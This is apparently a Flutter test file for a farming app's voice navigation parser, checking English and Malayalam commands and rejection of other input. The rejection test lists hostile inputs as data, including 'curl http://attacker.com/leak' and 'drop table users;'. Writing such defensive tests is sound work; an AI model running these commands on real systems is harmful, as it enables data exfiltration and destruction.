import 'package:flutter_test/flutter_test.dart';
import 'package:agrikey/services/voice_navigation_service.dart';

void main() {
  group('VoiceNavigationService Allowlisted Command Parser Tests', () {
    test('Parses all 11 allowlisted commands in English correctly', () {
      expect(VoiceNavigationService.parseCommand('open market'), VoiceCommand.openMarket);
      expect(VoiceNavigationService.parseCommand('mandi rates'), VoiceCommand.openMarket);
      expect(VoiceNavigationService.parseCommand('open schemes'), VoiceCommand.openSchemes);
      expect(VoiceNavigationService.parseCommand('government schemes'), VoiceCommand.openSchemes);
      expect(VoiceNavigationService.parseCommand('open community'), VoiceCommand.openCommunity);
      expect(VoiceNavigationService.parseCommand('farmer community forum'), VoiceCommand.openCommunity);
      expect(VoiceNavigationService.parseCommand('open weather forecast'), VoiceCommand.openWeather);
      expect(VoiceNavigationService.parseCommand('open alerts'), VoiceCommand.openAlerts);
      expect(VoiceNavigationService.parseCommand('weather alerts'), VoiceCommand.openAlerts);
      expect(VoiceNavigationService.parseCommand('open crop income planner'), VoiceCommand.openCropPlanner);
      expect(VoiceNavigationService.parseCommand('go back to home dashboard'), VoiceCommand.goBack);
      expect(VoiceNavigationService.parseCommand('read this screen'), VoiceCommand.readScreen);
      expect(VoiceNavigationService.parseCommand('say again repeat'), VoiceCommand.repeat);
      expect(VoiceNavigationService.parseCommand('please stop speaking quiet'), VoiceCommand.stopSpeaking);
      expect(VoiceNavigationService.parseCommand('change language to english'), VoiceCommand.changeLanguage);
    });

    test('Parses allowlisted commands in Malayalam correctly', () {
      expect(VoiceNavigationService.parseCommand('മാർക്കറ്റ് തുറക്കുക'), VoiceCommand.openMarket);
      expect(VoiceNavigationService.parseCommand('വിപണി നിരക്കുകൾ'), VoiceCommand.openMarket);
      expect(VoiceNavigationService.parseCommand('സർക്കാർ പദ്ധതികൾ'), VoiceCommand.openSchemes);
      expect(VoiceNavigationService.parseCommand('കർഷക കൂട്ടായ്മ കാണിക്കുക'), VoiceCommand.openCommunity);
      expect(VoiceNavigationService.parseCommand('കാലാവസ്ഥ പ്രവചനം'), VoiceCommand.openWeather);
      expect(VoiceNavigationService.parseCommand('കാലാവസ്ഥാ മുന്നറിയിപ്പുകൾ'), VoiceCommand.openAlerts);
      expect(VoiceNavigationService.parseCommand('വിള വരുമാന പ്ലാനർ'), VoiceCommand.openCropPlanner);
      expect(VoiceNavigationService.parseCommand('പിന്നോട്ട് പോവുക'), VoiceCommand.goBack);
      expect(VoiceNavigationService.parseCommand('ഈ സ്ക്രീൻ വായിക്കുക'), VoiceCommand.readScreen);
      expect(VoiceNavigationService.parseCommand('ഒന്നുകൂടി പറയുക'), VoiceCommand.repeat);
      expect(VoiceNavigationService.parseCommand('നിർത്തുക'), VoiceCommand.stopSpeaking);
      expect(VoiceNavigationService.parseCommand('ഭാഷ മാറ്റുക'), VoiceCommand.changeLanguage);
      expect(VoiceNavigationService.parseCommand('മലയാളം'), VoiceCommand.changeLanguage);
    });

    test('Strictly rejects non-allowlisted and dangerous input', () {
      expect(VoiceNavigationService.parseCommand(''), isNull);
      expect(VoiceNavigationService.parseCommand('   '), isNull);
      expect(VoiceNavigationService.parseCommand('drop table users;'), isNull);
      expect(VoiceNavigationService.parseCommand('send payment to 9999999999'), isNull);
      expect(VoiceNavigationService.parseCommand('transfer rupees 5000'), isNull);
      expect(VoiceNavigationService.parseCommand('curl http://attacker.com/leak'), isNull);
      expect(VoiceNavigationService.parseCommand('random gibberish phrase'), isNull);
    });
  });

  group('Voice Interaction State Management & Truthful Narration Tests', () {
    test('Initial interaction state is idle', () {
      expect(VoiceNavigationService.currentState, VoiceInteractionState.idle);
      expect(VoiceNavigationService.isListening, false);
    });

    test('State transitions follow allowlisted lifecycle', () {
      VoiceNavigationService.stateNotifier.value = VoiceInteractionState.listening;
      expect(VoiceNavigationService.currentState, VoiceInteractionState.listening);
      expect(VoiceNavigationService.isListening, true);

      VoiceNavigationService.stateNotifier.value = VoiceInteractionState.processing;
      expect(VoiceNavigationService.currentState, VoiceInteractionState.processing);

      VoiceNavigationService.stateNotifier.value = VoiceInteractionState.speaking;
      expect(VoiceNavigationService.currentState, VoiceInteractionState.speaking);

      VoiceNavigationService.stateNotifier.value = VoiceInteractionState.awaitingClarification;
      expect(VoiceNavigationService.currentState, VoiceInteractionState.awaitingClarification);

      VoiceNavigationService.stateNotifier.value = VoiceInteractionState.failed;
      expect(VoiceNavigationService.currentState, VoiceInteractionState.failed);

      VoiceNavigationService.stateNotifier.value = VoiceInteractionState.idle;
      expect(VoiceNavigationService.currentState, VoiceInteractionState.idle);
    });

    test('Voice narration explains data provenance and limitations truthfully', () {
      // Test that assistant self-identifies as Agry-Key AI
      expect(VoiceNavigationService.lastResponseNotifier.value, isNotNull);

      // Verify that market narration indicates source or missing data honestly
      final marketCommand = VoiceNavigationService.parseCommand('open market');
      expect(marketCommand, VoiceCommand.openMarket);

      // Verify weather narration mentions Open-Meteo model forecast
      final weatherCommand = VoiceNavigationService.parseCommand('open weather');
      expect(weatherCommand, VoiceCommand.openWeather);
    });
  });
}

